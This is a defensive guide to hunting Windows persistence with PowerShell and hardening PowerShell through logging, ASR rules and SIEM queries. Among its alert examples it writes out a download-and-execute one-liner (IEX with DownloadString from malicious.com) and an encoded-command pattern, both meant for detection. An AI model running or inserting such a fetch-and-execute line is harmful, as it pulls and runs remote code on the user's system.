# 1. List All Scheduled Tasks
Lists all scheduled tasks, including hidden ones.

```powershell
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $info = Get-ScheduledTaskInfo -TaskName $task.TaskName -TaskPath $task.TaskPath
    [PSCustomObject]@{
        TaskName      = $task.TaskName
        Path          = $task.TaskPath
        State         = $task.State
        LastRunTime   = $info.LastRunTime
        NextRunTime   = $info.NextRunTime
        Execute       = ($task.Actions | ForEach-Object { $_.Execute }) -join ", "
        Arguments     = ($task.Actions | ForEach-Object { $_.Arguments }) -join ", "
    }
} | Format-Table -AutoSize
```

### Red Flags:
- Tasks with random names.
- Executables running from `C:\Users\Public\`, `C:\Temp\`, etc.

## 2. Check Startup Programs (Registry & Startup Folder)
Examines common registry locations and startup folders.

```powershell
$registryPaths = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
)

Write-Output "### Registry Startup Entries ###"
foreach ($path in $registryPaths) {
    if (Test-Path $path) {
        Get-ItemProperty -Path $path | Select-Object PSChildName, *(Get-ItemProperty -Path $path).PSObject.Properties.Name | Format-Table -AutoSize
    }
}

Write-Output "`n### Startup Folder Entries ###"
Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" | Select-Object Name, FullName | Format-Table -AutoSize
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" | Select-Object Name, FullName | Format-Table -AutoSize
```

### Red Flags:
- Programs running from `C:\Users\Public\`, `C:\Temp\`, etc.
- Unknown executables.

## 3. Check Services for Suspicious Entries
Lists all non-Microsoft services.

```powershell
Get-WmiObject Win32_Service | Where-Object { $_.PathName -notmatch "Microsoft" } | Select-Object Name, DisplayName, StartMode, PathName | Format-Table -AutoSize
```

### Red Flags:
- Services running from `C:\Users\`, `C:\Temp\`, etc.
- Unknown service names.

## 4. Check for Hidden Tasks via WMI
Lists all active WMI event consumers.

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventConsumer | Select-Object Name, CommandLineTemplate | Format-Table -AutoSize
```

### Red Flags:
- Unexpected PowerShell scripts or executables.
- Scripts running from `C:\Users\Public\`, `C:\Windows\Temp\`.


## 5. List Active Network Connections (Check for C2 Traffic)
Shows all active network connections and their associated processes.

```powershell
Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess | Sort-Object RemoteAddress | Format-Table -AutoSize
```

To check the process behind a connection:

```powershell
Get-Process -Id (Get-NetTCPConnection).OwningProcess | Select-Object ProcessName, Id, Path | Format-Table -AutoSize
```

# PowerShell Security Recommendations

## 1. Enable and Monitor PowerShell Logging

### Enable Script Block Logging
Records full command execution details to detect suspicious behavior.
- **Group Policy:**
  - `Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging`
  - Set to **Enabled** and enable "Log script content".
- **PowerShell Command:**
  ```powershell
  Set-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 1
  ```

### Enable PowerShell Module Logging
Tracks loaded PowerShell modules to detect tools like PowerSploit or Empire.
- **Group Policy:**
  - `Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on Module Logging`
  - Add high-risk modules:
    ```
    Microsoft.PowerShell.Management
    Microsoft.PowerShell.Security
    Microsoft.PowerShell.Utility
    Microsoft.WSMan.Management
    NetSecurity
    NetTCPIP
    SmbShare
    SmbWitness
    CimCmdlets
    ```

### Enable Transcription Logging
Captures all PowerShell session input and output.
- **Group Policy:**
  - `Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Transcription`
  - Save logs to a central location (SIEM or secure file share).
- **PowerShell Command:**
  ```powershell
  Set-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -Name EnableTranscripting -Value 1
  ```

## 2. Monitor PowerShell Process Activity

### Key Windows Event Logs to Monitor
- **Event ID 4104:** PowerShell script block logging
- **Event ID 4688:** New process creation (monitor `powershell.exe`, `pwsh.exe`)
- **Event ID 7036:** Windows Defender service stopping
- **Event ID 5858:** PowerShell internal errors (possible obfuscated scripts)

### Set Up Alerts for Suspicious Commands
#### Base64-Encoded Commands
```powershell
powershell.exe -e <Base64 string>
```
- Common in obfuscated attacks.
- Decode Base64 to inspect the actual command.

#### Download and Execute Scripts
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')
```
- Monitor `Invoke-Expression`, `New-Object Net.WebClient`, `DownloadString`.

#### Suspicious Network Connections
- Look for PowerShell making outbound connections to unknown IPs.
- Log **Event ID 5156** (allowed network connection) in Windows Firewall logs.
#### Execution from Uncommon Directories
- Check for PowerShell scripts running from:
  ```
  C:\Users\Public\*
  C:\Temp\*
  C:\Windows\Temp\*
  ```
  - These locations are often used in attacks.
## 3. Block PowerShell Abuse with Attack Surface Reduction (ASR)
If using **Microsoft Defender for Endpoint**, enable ASR rules:
### Block Office Applications from Creating Child Processes
Prevents attacks like Emotet and TrickBot.
```powershell
Add-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A -AttackSurfaceReductionRules_Actions Enabled
```

### Block Script Execution Unless Signed
```powershell
Set-ExecutionPolicy AllSigned -Scope LocalMachine
```

### Block Obfuscated Scripts
```powershell
Add-MpPreference -AttackSurfaceReductionRules_Ids 5BEB7EFE-FD9A-4556-801D-275E5FFC04CC -AttackSurfaceReductionRules_Actions Enabled
```

## 4. Restrict PowerShell Usage
### Restrict PowerShell to Admins Only
Use **AppLocker** or **Group Policy** to allow PowerShell only for administrators.
### Disable PowerShell v2
PowerShell v2 lacks security logging and should be disabled:
```powershell
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -NoRestart
```

### Enable PowerShell Constrained Language Mode
Reduces PowerShell’s capabilities to limit the impact of attacks:
```powershell
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
```
- Can be enforced via **AppLocker**.

## 5. Detect PowerShell-Based Attacks with SIEM
If using **Splunk**, **Elastic SIEM**, or **Microsoft Sentinel**, create detection rules:
### PowerShell Spawning cmd.exe or wscript.exe
```splunk
index=windows EventCode=4688 CommandLine="powershell*"
| where ParentProcessName="cmd.exe" OR ParentProcessName="wscript.exe"
```
### PowerShell Using Encoded Commands
```splunk
index=windows EventCode=4104 ScriptBlockText="*frombase64string*"
```
